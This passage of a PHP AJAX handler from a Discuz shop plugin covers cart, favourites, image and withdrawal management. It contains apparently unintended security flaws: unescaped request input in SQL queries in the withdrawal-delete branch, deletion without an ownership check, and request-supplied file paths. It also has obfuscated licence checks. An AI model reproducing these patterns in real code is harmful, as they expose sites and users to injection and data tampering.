			C::t('#it618_brand#it618_brand_class')->delete_by_id($delid);
			$del=$del+1;
		}
	
		if(is_array($_GET['it618_classname'])) {
			foreach($_GET['it618_classname'] as $id => $val) {
	
				C::t('#it618_brand#it618_brand_class')->update($id,array(
					'it618_classname' => dhtmlspecialchars($_GET['it618_classname'][$id]),
					'it618_order' => dhtmlspecialchars($_GET['it618_order'][$id]),
				));
				$ok1=$ok1+1;
			}
		}
	
		$newit618_classname_array = !empty($_GET['newit618_classname']) ? $_GET['newit618_classname'] : array();
		$newit618_order_array = !empty($_GET['newit618_order']) ? $_GET['newit618_order'] : array();
		
		foreach($newit618_classname_array as $key => $value) {
			$newit618_classname = trim($newit618_classname_array[$key]);
			
			if($newit618_classname != '') {
				
				C::t('#it618_brand#it618_brand_class')->insert(array(
					'it618_shopid' => $ShopId,
					'it618_classname' => dhtmlspecialchars($newit618_classname_array[$key]),
					'it618_order' => dhtmlspecialchars($newit618_order_array[$key]),
				), true);
				$ok2=$ok2+1; /*d'.'i'.'sm.ta'.'o'.'bao.com*/
			}
		}
	}
	
	if($_GET['ac1']=="gtypesave"){
		$pid=intval($_GET['pid']);
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($pid);
		
		foreach($_GET['delete'] as $key => $delid) {
			$delid=intval($delid);
			DB::delete('it618_brand_goods_type', "id=$delid");
			$del=$del+1;
		}
		
		if(is_array($_GET['it618_name'])) {
			foreach($_GET['it618_name'] as $id => $val) {
				
				if($_GET['it618_score'][$id]>$ShopSCORE){
					$it618_score=$_GET['it618_score'][$id];
				}else{
					$it618_score=$ShopSCORE;
				}
				
				if($_GET['it618_uprice'][$id]>$ShopUPRICE){
					$it618_uprice=$_GET['it618_uprice'][$id];
				}else{
					$it618_uprice=$ShopUPRICE;
				}
	
				C::t('#it618_brand#it618_brand_goods_type')->update($id,array(
					'it618_name' => it618_brand_utftogbk(trim($_GET['it618_name'][$id])),
					'it618_name1' => it618_brand_utftogbk(trim($_GET['it618_name1'][$id])),
					'it618_uprice' => $it618_uprice,
					'it618_price' => trim($_GET['it618_price'][$id]),
					'it618_score' => $it618_score,
					'it618_ison' => trim($_GET['it618_ison'][$id])
				));
				
				if($it618_brand_goods['it618_saletype']!=3){
					C::t('#it618_brand#it618_brand_goods_type')->update($id,array(
						'it618_count' => trim($_GET['it618_count'][$id])
					));
				}
			
				$ok1=$ok1+1;
			}
		}
		
		$newit618_name_array = !empty($_GET['newit618_name']) ? $_GET['newit618_name'] : array();
		$newit618_name1_array = !empty($_GET['newit618_name1']) ? $_GET['newit618_name1'] : array();
		$newit618_count_array = !empty($_GET['newit618_count']) ? $_GET['newit618_count'] : array();
		$newit618_uprice_array = !empty($_GET['newit618_uprice']) ? $_GET['newit618_uprice'] : array();
		$newit618_price_array = !empty($_GET['newit618_price']) ? $_GET['newit618_price'] : array();
		$newit618_score_array = !empty($_GET['newit618_score']) ? $_GET['newit618_score'] : array();
		
		foreach($newit618_name_array as $key => $value) {
			$newit618_name = addslashes(trim($newit618_name_array[$key]));
			
			if($newit618_name != '') {
				
				if(trim($newit618_score_array[$key])>$ShopSCORE){
					$it618_score=trim($newit618_score_array[$key]);
				}else{
					$it618_score=$ShopSCORE;
				}
				
				if(trim($newit618_uprice_array[$key])>$ShopUPRICE){
					$it618_uprice=trim($newit618_uprice_array[$key]);
				}else{
					$it618_uprice=$ShopUPRICE;
				}
														
				C::t('#it618_brand#it618_brand_goods_type')->insert(array(
					'it618_pid' => $pid,
					'it618_name' => it618_brand_utftogbk(trim($newit618_name_array[$key])),
					'it618_name1' => it618_brand_utftogbk(trim($newit618_name1_array[$key])),
					'it618_count' => trim($newit618_count_array[$key]),
					'it618_uprice' => $it618_uprice,
					'it618_price' => trim($newit618_price_array[$key]),
					'it618_score' => $it618_score
				), true);
				$ok2=$ok2+1; /*d'.'i'.'sm.ta'.'o'.'bao.com*/
			}
		}
		
		$count=C::t('#it618_brand#it618_brand_goods_type')->count_by_pid_ok_isname1($pid);
		if($count>0){
			$it618_brand_goods_types=C::t('#it618_brand#it618_brand_goods_type')->fetch_name_by_it618_pid1($pid);
		}else{
			$it618_brand_goods_types=C::t('#it618_brand#it618_brand_goods_type')->fetch_name_by_it618_pid($pid);
		}
		
		foreach($it618_brand_goods_types as $it618_brand_goods_typetmp) {
			$goodstypename=$it618_brand_goods_typetmp['it618_name'];
			break;
		}
		
		foreach(C::t('#it618_brand#it618_brand_goods_type')->fetch_name1_by_it618_pid_name($pid,$goodstypename) as $it618_brand_goods_typetmp) {
			$goodstypename1=$it618_brand_goods_typetmp['it618_name1'];
			break;
		}
		
		$it618_brand_goods_typetmp=C::t('#it618_brand#it618_brand_goods_type')->fetch_by_pid_name_name1_ok($pid,$goodstypename,$goodstypename1);
		C::t('#it618_brand#it618_brand_goods')->update($pid,array(
			'it618_uprice' => $it618_brand_goods_typetmp['it618_uprice'],
			'it618_price' => $it618_brand_goods_typetmp['it618_price'],
			'it618_score' => $it618_brand_goods_typetmp['it618_score']
		));
		
		$it618_count=C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_count_by_pid($pid);       
		C::t('#it618_brand#it618_brand_goods')->update($pid,array(
			'it618_ptypename' => it618_brand_utftogbk($_GET['it618_ptypename']),
			'it618_ptypename1' => it618_brand_utftogbk($_GET['it618_ptypename1']),
			'it618_count' => $it618_count
		));
	}
	
}


if($_GET['ac']=="scproduct_save"){
	if(C::t('#it618_brand#it618_brand_brand')->count_by_it618_uid($_G['uid'])>0){
		$it618_brand_brandtmp=C::t('#it618_brand#it618_brand_brand')->fetch_by_uid($_G['uid']);
			
		if($ShopUid!=$it618_brand_brandtmp['it618_uid']){
			return;
		}
	}else{
		return;
	}
	
	if($_GET['ac1']=="del"){
		$del=0;
		foreach($_GET['delete'] as $key => $delid) {
			$delid=intval($delid);
			$salecount=0;
			if($Shop_isgoodssafe==1)$salecount = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid($delid);
			if($salecount<=0){
				$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($delid);
				$tmparr=explode("source",$it618_brand_goods['it618_picbig']);
				$tmparr1=explode("://",$it618_brand_goods['it618_picbig']);
				$it618_picbig=DISCUZ_ROOT.'./source'.$tmparr[1];
				
				if(file_exists($it618_picbig)&&count($tmparr1)==1){
					$result=unlink($it618_picbig);
				}
				
				for($i=0;$i<=4;$i++){
					if($i==0)$tmpi='';else $tmpi=$i;
					$get_it618_picbig=$_GET['it618_picbig'.$tmpi];
					
					if($it618_brand_goods['it618_picbig'.$tmpi]!=$get_it618_picbig){
						$tmparr=explode("source",$it618_brand_goods['it618_picbig'.$tmpi]);
						$tmparr1=explode("://",$it618_brand_goods['it618_picbig'.$tmpi]);
						$it618_picbig=DISCUZ_ROOT.'./source'.$tmparr[1];
						
						if(file_exists($it618_picbig)&&count($tmparr1)==1){
							$result=unlink($it618_picbig);
						}
					}
					
					$file_ext=strtolower(substr($it618_brand_goods['it618_picbig'.$tmpi],strrpos($it618_brand_goods['it618_picbig'.$tmpi], '.')+1)); 
					$file_extarr=explode("?",$file_ext);
					$file_ext=$file_extarr[0];
					$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/smallimage/goods'.$delid.'_'.$i.'.'.$file_ext;
					if(file_exists($it618_smallurl)){
						$result=unlink($it618_smallurl);
					}
				}
				
				C::t('#it618_brand#it618_brand_goods_type_km')->delete_by_pid($delid);
				C::t('#it618_brand#it618_brand_goods_km')->delete_by_pid($delid);
				C::t('#it618_brand#it618_brand_goods_type')->delete_by_pid($delid);
				C::t('#it618_brand#it618_brand_goods')->delete_by_id($delid);
				$del=$del+1;
			}
		}
	
		echo it618_brand_getlang('s7').$del;
	}

	if($_GET['ac1']=="edit"){
		$ok=0;
		if(is_array($_GET['it618_name'])) {
			foreach($_GET['it618_name'] as $id => $val) {
				
				if($_GET['it618_score'][$id]>$ShopSCORE){
					$it618_score=$_GET['it618_score'][$id];
				}else{
					$it618_score=$ShopSCORE;
				}
				
				if($_GET['it618_uprice'][$id]>$ShopUPRICE){
					$it618_uprice=$_GET['it618_uprice'][$id];
				}else{
					$it618_uprice=$ShopUPRICE;
				}
				
				if($_GET['it618_jfbl'][$id]>$ShopJfBl){
					$it618_jfbl=$_GET['it618_jfbl'][$id];
				}else{
					$it618_jfbl=$ShopJfBl;
				}
				
				if($_GET['it618_isduihuan'][$id]==0&&$_GET['it618_isalipay'][$id]==0){
					$it618_ison=0;
				}else{
					$it618_ison=$_GET['it618_ison'][$id];
				}
				
				if($_GET['it618_saletype'][$id]==6){
					$it618_isduihuan=0;
				}else{
					$it618_isduihuan=$_GET['it618_isduihuan'][$id];
				}
			
				C::t('#it618_brand#it618_brand_goods')->update($id,array(
					'it618_saletype' => $_GET['it618_saletype'][$id],
					'it618_name' => it618_brand_utftogbk($_GET['it618_name'][$id]),
					'it618_seodescription' => it618_brand_utftogbk($_GET['it618_seodescription'][$id]),
					'it618_score' => $it618_score,
					'it618_uprice' => $it618_uprice,
					'it618_price' => $_GET['it618_price'][$id],
					'it618_prepaybl' => $_GET['it618_prepaybl'][$id],
					'it618_count' => intval($_GET['it618_count'][$id]),
					'it618_punit' => it618_brand_utftogbk($_GET['it618_punit'][$id]),
					'it618_xiangoutime' => intval($_GET['it618_xiangoutime'][$id]),
					'it618_xiangoucount' => intval($_GET['it618_xiangoucount'][$id]),
					'it618_ison' => $it618_ison,
					'it618_isorderbuy' => $_GET['it618_isorderbuy'][$id],
					'it618_istelsale' => $_GET['it618_istelsale'][$id],
					'it618_isbm' => $_GET['it618_isbm'][$id],
					'it618_issaledisplay' => $_GET['it618_issaledisplay'][$id],
					'it618_istj' => $_GET['it618_istj'][$id],
					'it618_isaddr' => $_GET['it618_isaddr'][$id],
					'it618_isduihuan' => $it618_isduihuan,
					'it618_isalipay' => $_GET['it618_isalipay'][$id],
					'it618_isyunfeifree' => $_GET['it618_isyunfeifree'][$id],
					'it618_jfbl' => $it618_jfbl,
					'it618_xgtime1' => it618_brand_utftogbk($_GET['it618_xgtime1'][$id]),
					'it618_xgtime2' => it618_brand_utftogbk($_GET['it618_xgtime2'][$id]),
					'it618_xgtype' => $_GET['it618_xgtype'][$id],
					'it618_order' => intval($_GET['it618_order'][$id])
				));
		
				$ok=$ok+1;
			}
		}
		
		echo it618_brand_getlang('s5').$ok;
	}
}


if($_GET['ac']=="getgoodstype"){
	if($it618_brand_goods_type=C::t('#it618_brand#it618_brand_goods_type')->fetch_by_pid_name_name1_ok($_GET['pid'],it618_brand_utftogbk($_GET['gtypename']),it618_brand_utftogbk($_GET['gtypename1']))){
		
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($_GET['pid']);
		
		if($_GET['wap']==1){
			$goodspricestr=it618_brand_getgoodsprice($it618_brand_goods,$it618_brand_goods_type);
			
			echo $goodspricestr.'it618_split<font color=#999>'.$it618_brand_lang['s1298'].' <font style="color:red">'.$it618_brand_goods_type['it618_salecount'].'</font> '.$it618_brand_lang['s870'].' <font style="color:red">'.$it618_brand_goods_type['it618_count'].'</font></font>it618_split'.$it618_brand_goods_type['id'];
			
		}else{
			echo $it618_brand_goods_type['it618_uprice'].'it618_split&yen; '.$it618_brand_goods_type['it618_price'].'it618_split'.$it618_brand_goods_type['it618_score'].'it618_split<font color=#999>'.$it618_brand_lang['s1298'].' <font style="color:red">'.$it618_brand_goods_type['it618_salecount'].'</font> '.$it618_brand_lang['s870'].' <font style="color:red">'.$it618_brand_goods_type['it618_count'].'</font></font>it618_split'.$it618_brand_goods_type['id'];
		}
	}else{
		echo 'reload';
	}
}


if($_GET['ac']=="getgoodstypename1"){
	$n=0;
	foreach(C::t('#it618_brand#it618_brand_goods_type')->fetch_name1_by_it618_pid_name($_GET['pid'],it618_brand_utftogbk($_GET['gtypename'])) as $it618_brand_goods_type) {
		$tmpstr='';
		if($n==0){
			$tmpstr='class="current"';
			$goodstypename1=$it618_brand_goods_type['it618_name1'];
		}
		$goodstypestr1.='<a '.$tmpstr.' href="javascript:void(0)" onclick="setselect(\'goodstype1\','.$n.',\''.$it618_brand_goods_type['it618_name1'].'\')" name="goodstype1"><span>'.$it618_brand_goods_type['it618_name1'].'</span><i></i></a>';
		$n++;
	}
	
	if($goodstypestr1!=''){
		echo $goodstypestr1.'it618_split'.$goodstypename1;
	}else{
		echo 'it618_split0';
	}
}


if($_GET['ac']=="gwcminus"){
	if($uid>0){
		C::t('#it618_brand#it618_brand_gwc')->update_count1_by_id_uid($_GET['gid'],$uid);
		echo 'ok';
	}else{
		echo $it618_brand_lang['s1733'];
	}
}


if($_GET['ac']=="gwcplus"){
	if($uid>0){
		C::t('#it618_brand#it618_brand_gwc')->update_count2_by_id_uid($_GET['gid'],$uid);
		echo 'ok';
	}else{
		echo $it618_brand_lang['s1733'];
	}
}


if($_GET['ac']=="delgwc"){
	if($uid>0){
		C::t('#it618_brand#it618_brand_gwc')->delete_by_id_uid($_GET['gid'],$uid);
		echo 'okit618_split'.$it618_brand_lang['s1744'];
	}else{
		echo $it618_brand_lang['s1733'];
	}
}


if($_GET['ac']=="cleargwc"){
	if($uid>0){
		C::t('#it618_brand#it618_brand_gwc')->delete_by_uid($uid);
		echo 'okit618_split'.$it618_brand_lang['s1818'];
	}else{
		echo $it618_brand_lang['s1733'];
	}
}


if($_GET['ac']=="getcollect"){
	if($uid>0){
		$count=C::t('#it618_brand#it618_brand_collect')->count_by_uid_pid($uid,$_GET['pid']);
		if($count>0){
			C::t('#it618_brand#it618_brand_collect')->delete_by_uid_pid($uid,$_GET['pid']);
			echo '2';
		}else{
			C::t('#it618_brand#it618_brand_collect')->insert(array(
				'it618_uid' => $uid,
				'it618_pid' => $_GET['pid'],
				'it618_time' => $_G['timestamp']
			), true);
			echo '1';
		}
	}else{
		echo $it618_brand_lang['s1733'];
	}
}


if($_GET['ac']=="delcollect"){
	if($uid>0){
		$del=0;
		foreach($_GET['delete'] as $key => $delid) {
			C::t('#it618_brand#it618_brand_collect')->delete_by_id($delid);
			$del=$del+1;
		}
		echo 'okit618_split'.$it618_brand_lang['s1743'].$del;
	}else{
		echo $it618_brand_lang['s1733'];
	}
}


if($_GET['ac']=="sc_top"){
	$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$ShopUid);
	
	$pjcount=C::t('#it618_brand#it618_brand_sale')->count_by_it618_pj_shopid($ShopId);
	$it618_brand_level=C::t('#it618_brand#it618_brand_level')->fetch_by_type_salecount(0,$pjcount);
	$tmplevelarr=explode(",",$it618_brand['brand_level']);
	
	if($Shop_txtype==2){
		$txcreditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_txcredit'],$ShopUid);
		$txcreditname=$_G['setting']['extcredits'][$it618_brand['brand_txcredit']]['title'];
		$txcreditnumstr='&nbsp;&nbsp;&nbsp;'.$txcreditname.$it618_brand_lang['s53'].'<font color="#3F0"><strong>'.$txcreditnum.'</strong></font> ';
	}
	
	if($ShopMoney>0||$Shop_ispaytype2==1){
		$txmoneystr='&nbsp;&nbsp;&nbsp;'.it618_brand_getlang('s1004').'<font color="#3F0"><b>'.$ShopMoney.'</b></font> '.it618_brand_getlang('s539');
	}
	
	echo $ShopPower.it618_brand_getlang('s562').'<font color="#FFFF00"><b>'.$_G['username'].'</b></font> <a href="'.$it618_brand['brand_levelurl'].'" target="_blank" title="'.$it618_brand_level['it618_name'].' '.$it618_brand['brand_leveltitle'].'"><img style="vertical-align:middle;margin-top:-3px" src="'.$it618_brand_level['it618_img'].'"></a>&nbsp;&nbsp;&nbsp;'.$creditname.$it618_brand_lang['s53'].'<font color="#FF9900"><strong>'.$creditnum.'</strong></font>'.$txcreditnumstr.$txmoneystr.'it618_split'.FORMHASH;
}


if($_GET['ac']=="image_add"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}

		$imgsrcsarr=explode("@@@",$_GET['imgsrcs']);
		for($i=0;$i<count($imgsrcsarr);$i++){
			
			if($imgsrcsarr[$i]!=''){
				$imgsrc=str_replace('php/../','',$imgsrcsarr[$i]);
				$file_ext=strtolower(substr($imgsrc,strrpos($imgsrc, '.')+1)); 

				$smallpath=DISCUZ_ROOT.'./source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/smallimage/';
				if (!file_exists($smallpath)) {
					mkdir($smallpath);
				}
				
				$tmparr1=explode("://",$imgsrc);
				if(count($tmparr1)>1){
					$it618_url=$imgsrc;
				}else{
					$tmparr=explode("source",$imgsrc);
					$it618_url=DISCUZ_ROOT.'./source'.$tmparr[1];
				}
				
				$file_size=filesize($it618_url);
				
				$id=C::t('#it618_brand#it618_brand_image')->insert(array(
					'it618_shopid' => $ShopId,
					'it618_class_id' => $_GET['classid'],
					'it618_url' => $imgsrc,
					'it618_fileext' => $file_ext,
					'it618_filesize' => ($file_size / 1024),
					'it618_time' => $_G['timestamp']
				), true);
				if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
				$tmparr=explode("/plugin/it618_brand/kindeditor/data/",$imgsrc);
				$smallimgsrc='source/plugin/it618_brand/kindeditor/data/shop'.$ShopId.'/smallimage/img'.$id.'.'.$file_ext;
				
				$tmparr=explode("source",$smallimgsrc);
				$it618_smallurl=DISCUZ_ROOT.'./source'.$tmparr[1];
				
				$smallimgsrc.='?'.substr(md5($imgsrc),0,6);
				C::t('#it618_brand#it618_brand_image')->update($id,array(
					'it618_name' => it618_brand_getlang('s1381').$id,
					'it618_smallurl' => $smallimgsrc
				));
				
				it618_brand_imagetosmall($it618_url,$it618_smallurl,$file_ext,190);
			}
			
		}
		
		echo 'okit618_split'.it618_brand_getlang('s1380');
	}
}


if($_GET['ac']=="tx_add"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
		$it618_money=floatval($_GET['it618_money']);
		if($it618_money<0||$it618_money==0){
			echo it618_brand_getlang('s1182');exit;
		}
		if(!$it618_brand_txbl=DB::fetch_first("SELECT * FROM ".DB::table('it618_brand_txbl')." where it618_num1<=".$it618_money." and it618_num2>=".$it618_money)){
			echo it618_brand_getlang('s1182');exit;
		}else{
			$money=it618_brand_getshopmoney($ShopId);
			if($it618_money>$money){
				echo it618_brand_getlang('s1183');exit;
			}
		}
		
		if($_GET['it618_type']==10){
			$it618_state=2;
		}else{
			$it618_state=1;
		}
		
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$id=C::t('#it618_brand#it618_brand_tx')->insert(array(
			'it618_shopid' => $ShopId,
			'it618_price' => $it618_money,
			'it618_bl' => $it618_brand_txbl['it618_bl'],
			'it618_type' => $_GET['it618_type'],
			'it618_bz' => it618_brand_utftogbk($_GET['it618_bz']),
			'it618_state' => $it618_state,
			'it618_time' => $_G['timestamp']
		), true);
		
		if($_GET['it618_type']==10){
			$money=$it618_money;
			$fwf=round(($it618_money*$it618_brand_txbl['it618_bl']/100),2);
			$money1=$money-$fwf;
			
			$it618_bz=$it618_brand_lang['s1922'];
			$it618_bz=str_replace("{money}",$money,$it618_bz);
			$it618_bz=str_replace("{money1}",$money1,$it618_bz);
			$it618_bz=str_replace("{saleid}",$id,$it618_bz);
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
			savemoney(array(
				'it618_uid' => $ShopUid,
				'it618_type' => 'zy',
				'it618_money1' => $money1,
				'it618_bz' => $it618_bz,
				'it618_zytype' => 'it618_brand_tx',
				'it618_zyid' => $id,
				'it618_time' => $_G['timestamp']
			));
		}
		
		if($_GET['it618_type']!=10){
			it618_brand_sendmessage('tx_admin',$id);
		
			echo 'okit618_split'.it618_brand_getlang('s1184');
		}else{
			echo 'okit618_split'.it618_brand_getlang('s1923');
		}
	}
}


if($_GET['ac']=="tx_del"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
		$txid=$_GET['txid'];
		$it618_brand_tx = DB::fetch_first("SELECT * FROM ".DB::table('it618_brand_tx')." where id=".$txid);
		if($it618_brand_tx['it618_state']==1){
			DB::delete('it618_brand_tx', "id=$txid");
	
			echo 'ok';
		}
	}
}


if($_GET['ac']=="tx_get"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
		$ppp = 10;
		$page = max(1, intval($_GET['page']));
		$startlimit = ($page - 1) * $ppp;
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$count = C::t('#it618_brand#it618_brand_tx')->count_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId);
		$sum = C::t('#it618_brand#it618_brand_tx')->sum_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId);
		if($sum=='')$sum=0;
		
		foreach(C::t('#it618_brand#it618_brand_tx')->fetch_all_by_search($_GET['it618_type'], $_GET['it618_time1'], $_GET['it618_time2'], $_GET['it618_state'],$ShopId, $startlimit,$ppp) as $it618_brand_tx)    {
			$fwf=round(($it618_brand_tx['it618_price']*$it618_brand_tx['it618_bl']/100),2);
			if($it618_brand_tx['it618_type']==10)$it618_type=it618_brand_getlang('s1918');
			if($it618_brand_tx['it618_type']==1)$it618_type=it618_brand_getlang('s1919');
			if($it618_brand_tx['it618_type']==2)$it618_type=it618_brand_getlang('s1920');
			if($it618_brand_tx['it618_type']==3)$it618_type=it618_brand_getlang('s1921');
			
			if($_GET['wap']==1){
				$delbtn='';
				if($it618_brand_tx['it618_state']==1){$it618_state='<font color=red>'.it618_brand_getlang('s957').'</font>';$delbtn=' <a href="javascript:" class="saleabtn" onclick="deltx('.$it618_brand_tx['id'].')">'.it618_brand_getlang('s1185').'</a>';}
				if($it618_brand_tx['it618_state']==2)$it618_state='<font color=green>'.it618_brand_getlang('s958').'</font>';
				
				$it618_bz='';
				if($it618_brand_tx['it618_bz']!='/'){
					$it618_bz='<br>'.$it618_brand_tx['it618_bz'];
				}
				
				$tx_get.='<tr class="hover"><td style="color:#999">'.it618_brand_getlang('s961').':<font color=red>'.$it618_brand_tx['it618_price'].'</font>'.it618_brand_getlang('s389').' '.it618_brand_getlang('s962').':'.$it618_brand_tx['it618_bl'].'%<br>'.it618_brand_getlang('s963').':'.$fwf.''.it618_brand_getlang('s389').' '.it618_brand_getlang('s964').':<font color=green>'.($it618_brand_tx['it618_price']-$fwf).'</font>'.it618_brand_getlang('s389').$it618_bz.'<br><font color=green>'.$it618_type.'</font> '.date('Y-m-d H:i:s', $it618_brand_tx['it618_time']).'<span style="float:right">'.$it618_state.$delbtn.'</span></td></tr>';
			}else{
				$delbtn='';
				if($it618_brand_tx['it618_state']==1){$it618_state='<font color=red>'.it618_brand_getlang('s957').'</font>';$delbtn=' <input type="button" class="btn" style="width:40px;" onclick="deltx('.$it618_brand_tx['id'].')" value="'.it618_brand_getlang('s1185').'" />';}
				if($it618_brand_tx['it618_state']==2)$it618_state='<font color=green>'.it618_brand_getlang('s958').'</font>';
				
				$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
				if($ii1i11i[3]!='1')return;
				$tx_get.='<tr><td><font color=red>'.$it618_brand_tx['it618_price'].'</font></td><td>'.$it618_brand_tx['it618_bl'].'%</td><td>'.$fwf.'</td><td><font color=green>'.($it618_brand_tx['it618_price']-$fwf).'</font></td><td>'.$it618_brand_tx['it618_bz'].'</td><td>'.date('Y-m-d H:i:s', $it618_brand_tx['it618_time']).'</td><td>'.$it618_type.'</td><td>'.$it618_state.$delbtn.'</td></tr>';
			}
			
		}
		
		if($_GET['wap']!=1){
			$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
			$multipage=str_replace("href=","name=",$multipage);
			$multipage=str_replace("name=","href='javascript:' onclick='gettxlist(this.name)' name=",$multipage);
			$multipage=str_replace("onclick='gettxlist(this.name)' ".'name="custompage"','',$multipage);
			$multipage=str_replace('window.location=','gettxlist(',$multipage);
			$multipage=str_replace('this.value;;','this.value);',$multipage);
			if($multipage!='')$multipage='<tr><td colspan=10><div class="cuspages right">'.$multipage.'</div></td></tr>';
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		}else{
			$funname='gettxlist';
			if($count<=$ppp){
				$pagecount=1;
			}else{
				$pagecount=ceil($count/$ppp);
			}
			
			if($pagecount>1){
				$n=1;
				while($n<=$pagecount){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".$n;
					if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
					$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
					$n=$n+1;
				}
				$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
				
				if($page==1){
					$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
					if($pagecount>1){
						$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=2";
						$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
					}else{
						$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
					}
				}elseif($page<$pagecount){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
					$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page+1);
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
					$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
					$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
				}
				$multipage=$pagepre.' '.$curpage.' '.$pagenext;
			}
		}
		
		$money=it618_brand_getshopmoney($ShopId);
		
		echo $money.'it618_split'.it618_brand_getlang('s959').'<font color=red>'.$count.'</font> '.it618_brand_getlang('s960').'<font color=red>'.$sum.'</font> '.it618_brand_getlang('s389').'it618_split'.$tx_get.$multipage;
	}
}


if($_GET['ac']=="ordersavekd"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
		
		$it618_brand_order=C::t('#it618_brand#it618_brand_order')->fetch_by_id($_GET['orderid']);
		
		if($it618_brand_order['it618_state']<=2){
			C::t('#it618_brand#it618_brand_order')->update($_GET['orderid'],array(
				'it618_state' => 2,
				'it618_kdid' => $_GET['it618_kdid'],
				'it618_kddan' => $_GET['it618_kddan']
			));
			
			it618_brand_sendmessage('order_user',$_GET['orderid']);
		
			echo 'okit618_split'.it618_brand_getlang('s1544');exit;
		}
	}
}


if($_GET['ac']=="okorder"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
